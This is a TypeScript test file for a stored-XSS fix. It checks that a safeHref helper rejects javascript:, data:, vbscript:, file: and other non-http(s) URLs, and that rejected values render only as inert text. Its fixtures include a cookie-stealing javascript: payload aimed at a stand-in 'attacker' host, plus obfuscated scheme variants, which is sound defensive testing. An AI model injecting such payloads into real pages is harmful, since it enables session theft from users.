/**
 * Pins for the client-side half of the stored-XSS fix.
 *
 * The server now rejects non-http(s) schemes at the write boundary, but rows
 * written before that check existed are still in the database and are returned
 * verbatim, so the render path has to re-check.
 */
import { existsSync, readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { JSDOM } from 'jsdom';
import { SAFE_SCHEMES, safeHref } from './safe-url.js';

/**
 * Resolve web/src. These tests are compiled into .tmp-test/ before running, so
 * import.meta.url points at the build output, not at the sources. Walk up to the
 * directory holding package.json and take src/ from there, which works whether
 * this runs from src/ or from .tmp-test/.
 */
function sourceRoot(): string {
  let dir = fileURLToPath(new URL('.', import.meta.url));
  while (!existsSync(join(dir, 'package.json'))) {
    const parent = dirname(dir);
    if (parent === dir) throw new Error('could not locate web/package.json from ' + import.meta.url);
    dir = parent;
  }
  return join(dir, 'src');
}

function assert(condition: boolean, message: string): void {
  if (!condition) throw new Error(message);
}

const XSS = "javascript:fetch('//attacker/'+document.cookie)";

/**
 * Every one of these must be refused. Note that several are NOT rejected by
 * Go's net/url (which errors on control characters) but ARE normalised by the
 * WHATWG URL parser the browser and this helper use: `new URL('java\tscript:x')`
 * yields protocol 'javascript:'. That divergence is exactly why this has to be
 * an allow-list on the parsed scheme rather than a denylist on the raw string.
 */
function testRejectsUnsafeSchemes(): void {
  const rejected: ReadonlyArray<readonly [string, string]> = [
    ['javascript', 'javascript:alert(1)'],
    ['javascript exfiltration', XSS],
    ['javascript mixed case', 'JaVaScRiPt:alert(1)'],
    ['javascript upper case', 'JAVASCRIPT:alert(1)'],
    ['leading tab', '\tjavascript:alert(1)'],
    ['leading newline', '\njavascript:alert(1)'],
    ['leading space', ' javascript:alert(1)'],
    ['embedded tab', 'java\tscript:alert(1)'],
    ['embedded newline', 'java\nscript:alert(1)'],
    ['embedded carriage return', 'java\rscript:alert(1)'],
    ['data html', 'data:text/html,<script>alert(1)</script>'],
    ['data base64', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
    ['vbscript', 'vbscript:msgbox(1)'],
    ['blob', 'blob:https://example.com/uuid'],
    ['file', 'file:///etc/passwd'],
    // mailto: is a deliberate rejection, not an oversight: the server's
    // allow-list rejects it too, so rendering it would be dead code.
    ['mailto', 'mailto:a@b.com'],
    // Relative and protocol-relative inputs are rejected because there is no
    // base argument. With one, '//evil.com/x' would become an ACCEPTED
    // 'https://evil.com/x'.
    ['protocol relative', '//evil.com/x'],
    ['absolute path', '/relative/path'],
    ['bare word', 'not-a-url'],
    ['http without host', 'http://'],
    ['empty', ''],

    // ── fixtures that isolate the scheme allow-list ─────────────────────────
    //
    // Everything above this line is rejected by BOTH guards, or throws before
    // reaching either, so none of it can tell the allow-list apart from the
    // host check. Measured: with only the rows above, deleting the allow-list
    // outright, or widening it to include javascript:/data:/vbscript:, left
    // the suite GREEN.
    //
    // These four are WHATWG "special" schemes: they parse successfully AND
    // yield a non-empty hostname, so the host check cannot reject them. The
    // allow-list is the only thing that does.
    ['ftp', 'ftp://evil.com/x'],
    ['ws', 'ws://evil.com/x'],
    ['wss', 'wss://evil.com/x'],
    // Also distinguishes membership from a prefix test: a scheme that starts
    // with "http" but is not "http". Guards against `startsWith('http')`.
    ['httpx prefix not membership', 'httpx://evil.com/x'],
  ];

  for (const [name, input] of rejected) {
    assert(
      safeHref(input) === undefined,
      `safeHref(${JSON.stringify(input)}) should be undefined for "${name}", got ${JSON.stringify(safeHref(input))}`,
    );
  }

  assert(safeHref(undefined) === undefined, 'safeHref(undefined) should be undefined');
  assert(safeHref(null) === undefined, 'safeHref(null) should be undefined');
}

function testAcceptsHTTPAndHTTPS(): void {
  const accepted: readonly string[] = [
    'https://github.com/o/r/pull/1',
    'http://example.com/x',
    'HtTpS://example.com',
    'https://example.com:8443/x',
    'https://example.com/x?a=1&b=2#frag',
    'https://user:pass@example.com/x',
  ];
  for (const input of accepted) {
    assert(
      safeHref(input) === input,
      `safeHref(${JSON.stringify(input)}) should return the input unchanged, got ${JSON.stringify(safeHref(input))}`,
    );
  }
}

/**
 * Pins the reachability precondition of safeHref's `hostname === ''` guard.
 *
 * That guard cannot be pinned by a fixture, because no input reaches it: both
 * allow-listed schemes are WHATWG "special" schemes, for which an empty host
 * makes the parse THROW rather than yield an empty hostname. Deleting the
 * guard therefore leaves every behavioural test green, and no fixture can
 * change that -- unreachable code has no behaviour to assert on.
 *
 * What IS pinnable is the condition under which the guard becomes live. Every
 * script-bearing scheme (javascript:, data:, vbscript:, blob:, mailto:) is
 * NON-special and parses with hostname === '', so the guard is precisely what
 * makes an accidental widening of SAFE_SCHEMES fail closed. This test fails
 * the moment a non-special scheme is added to the allow-list -- i.e. the
 * moment the guard stops being unreachable and starts carrying weight.
 */
function testHostGuardIsAFailClosedBackstop(): void {
  assert(SAFE_SCHEMES.size > 0, 'SAFE_SCHEMES is empty; this test would be vacuous');

  for (const scheme of SAFE_SCHEMES) {
    let threw = false;
    try {
      new URL(`${scheme}//`);
    } catch {
      threw = true;
    }
    assert(
      threw,
      `${scheme} is a non-special scheme: "${scheme}//" parses with an empty host instead of ` +
        'throwing. safeHref\'s hostname==="" guard is now REACHABLE and load-bearing, so it ' +
        'needs a real rejection fixture -- and adding a non-special scheme to SAFE_SCHEMES is ' +
        'itself almost certainly a mistake, since every script-bearing scheme is non-special.',
    );
  }

  // Positive control: the detector must actually be able to see a non-special
  // scheme. Without this, the loop above would pass if `new URL` threw for
  // everything, or if the set were silently unreadable.
  let nonSpecialThrew = false;
  try {
    new URL('javascript://');
  } catch {
    nonSpecialThrew = true;
  }
  assert(
    !nonSpecialThrew,
    'positive control: "javascript://" should parse (non-special schemes tolerate an empty ' +
      'host); if it throws, this test can no longer tell special from non-special schemes',
  );
  assert(
    new URL('javascript://').hostname === '',
    'positive control: a non-special scheme should yield hostname === "", which is the ' +
      'condition the guard under test exists to catch',
  );
}

/**
 * The behavioural pin the brief asks for: a persisted javascript: URL must not
 * reach the href attribute of a real DOM node.
 *
 * This renders through JSDOM and reads the attribute back, rather than asserting
 * on a string, so it measures what the DOM ends up holding.
 */
function testPayloadNeverReachesHrefAttribute(): void {
  const dom = new JSDOM('<!doctype html><body><div id="host"></div></body>');
  const doc = dom.window.document;
  const host = doc.getElementById('host')!;

  // Mirrors the guarded shape used by ft-inspector-code.ts and
  // ft-inspector-meta.ts: link when safeHref accepts, inert span when it does not.
  const renderGuarded = (raw: string): void => {
    const href = safeHref(raw);
    if (href === undefined) {
      const span = doc.createElement('span');
      span.textContent = raw;
      host.replaceChildren(span);
    } else {
      const a = doc.createElement('a');
      a.setAttribute('href', href);
      a.setAttribute('target', '_blank');
      a.setAttribute('rel', 'noopener');
      a.textContent = 'link';
      host.replaceChildren(a);
    }
  };

  renderGuarded(XSS);
  assert(host.querySelector('a') === null, 'a javascript: URL must not produce an anchor at all');
  assert(
    !host.innerHTML.includes('href'),
    `no href attribute should be emitted, got: ${host.innerHTML}`,
  );
  // Degrade, do not drop: the value stays visible to the user as inert text.
  assert(
    host.textContent === XSS,
    `rejected URL should remain visible as text, got: ${host.textContent}`,
  );

  // Positive control for this harness: the identical render path DOES produce an
  // href for a legitimate URL. Without this, an assertion of "no href" would
  // pass even if renderGuarded were silently broken and rendered nothing ever.
  const good = 'https://github.com/o/r/pull/1';
  renderGuarded(good);
  const anchor = host.querySelector('a');
  assert(anchor !== null, 'positive control: a legitimate https URL must produce an anchor');
  assert(
    anchor!.getAttribute('href') === good,
    `positive control: href should be ${good}, got ${anchor!.getAttribute('href')}`,
  );
}

/**
 * target="_blank" is currently an incidental mitigation on both anchors: engines
 * block javascript: navigation into a new browsing context, but nothing pinned
 * that attribute, so removing it would quietly change the severity of any URL
 * that slipped past the scheme checks. This pins it.
 */
function testExternalAnchorsKeepTargetBlank(): void {
  const files = [
    'components/inspector/ft-inspector-code.ts',
    'components/inspector/ft-inspector-meta.ts',
  ];
  const src = sourceRoot();

  for (const rel of files) {
    const text = readFileSync(join(src, rel), 'utf8');
    const anchors = text.split('\n').filter((l) => l.includes('href=${href}'));
    assert(anchors.length > 0, `${rel}: expected a guarded href=\${href} anchor, found none`);
    for (const line of anchors) {
      assert(
        line.includes('target="_blank"'),
        `${rel}: guarded anchor lost target="_blank": ${line.trim()}`,
      );
      assert(
        line.includes('rel="noopener"'),
        `${rel}: guarded anchor lost rel="noopener": ${line.trim()}`,
      );
    }
  }
}

function run(): void {
  testRejectsUnsafeSchemes();
  testAcceptsHTTPAndHTTPS();
  testHostGuardIsAFailClosedBackstop();
  testPayloadNeverReachesHrefAttribute();
  testExternalAnchorsKeepTargetBlank();
  console.log('safe-url: ok');
}

run();
